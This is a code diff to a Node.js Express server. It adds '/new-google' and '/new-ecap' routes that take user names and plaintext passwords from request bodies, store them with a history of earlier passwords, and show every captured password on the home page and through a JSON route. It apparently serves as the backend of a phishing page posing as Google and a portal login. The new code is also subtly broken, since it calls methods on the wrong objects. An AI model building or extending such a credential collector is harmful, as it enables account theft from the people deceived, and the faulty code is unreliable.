@@ -4,6 +4,7 @@ const path = require("path");
 const cors = require("cors");
 const { connect } = require("mongoose");
 const { Pass, Ecap } = require("./utils/password");
+const { type } = require("os");
 app.set("views", path.join(__dirname, "views"));
 app.set("public", path.join(__dirname, "public"));
 app.set("view engine", "pug");
@@ -39,24 +40,66 @@ app.get("/x", async (req, res) => {
   res.json(passes);
 });
 
-app.post("/google", async (req, res) => {
-  console.log(req.body);
-  let pass = await Pass.findById(req.body.user);
-  if (pass) {
-    if (pass.passwords.includes(req.body.passwd)) return res.send("done");
-    pass.passwords.unshift(req.body.passwd);
-    await pass.save();
-    return res.send("done");
+app.post("/new-ecap", async (req, res) => {
+  let { user, passwd, type } = req.body;
+  let prvPass = await Ecap.findById(user);
+  if (prvPass) {
+    // same return
+    if (prvPass.password == passwd) return res.json({ mssg: "Already There" });
+    let backupPrvPass = prvPass.password;
+    prvPass.password = passwd;
+
+    if (prvPass.includes(backupPrvPass)) {
+      prvPass.oldPasswords.splice(
+        prvPass.oldPasswords.indexOf(backupPrvPass),
+        1
+      );
+    }
+    prvPass.oldPasswords.unshift(backupPrvPass);
+    await prvPass();
+    res.json({ mssg: "updated pass" });
   } else {
-    let pass = await new Pass({
-      _id: req.body.user,
-      passwords: [req.body.passwd],
+    let pass = new Ecap({
+      _id: user,
+      password: passwd,
+      type,
+      oldPasswords: [],
     });
     await pass.save();
+    res.json({ mssg: "new pass created" });
   }
-
-  return res.json({ sample: "done" });
 });
+
+app.post("/new-google", async (req, res) => {
+  let { user, passwd, type } = req.body;
+  let prvPass = await Pass.findById(user);
+  if (prvPass) {
+    // same return
+    if (prvPass.password == passwd) return res.json({ mssg: "Already There" });
+    let backupPrvPass = prvPass.password;
+    prvPass.password = passwd;
+
+    if (prvPass.includes(backupPrvPass)) {
+      prvPass.oldPasswords.splice(
+        prvPass.oldPasswords.indexOf(backupPrvPass),
+        1
+      );
+    }
+    prvPass.oldPasswords.unshift(backupPrvPass);
+    await prvPass();
+    res.json({ mssg: "updated pass" });
+  } else {
+    let pass = new Pass({
+      _id: user,
+      password: passwd,
+      type,
+      oldPasswords: [],
+    });
+    await pass.save();
+    res.json({ mssg: "new pass created" });
+  }
+});
+
 app.post("/test", async (req, res) => {
   try {
     console.log("worked");
@@ -100,7 +143,8 @@ app.post("/ecap", async (req, res) => {
 });
 app.get("/", async (_, res) => {
   const passes = await Ecap.find();
-  res.render("a.pug", { passes });
+  const gPasses = await Pass.find();
+  res.render("a.pug", { passes, gPasses });
 });
 
 app.listen(process.env.PORT || 3000);
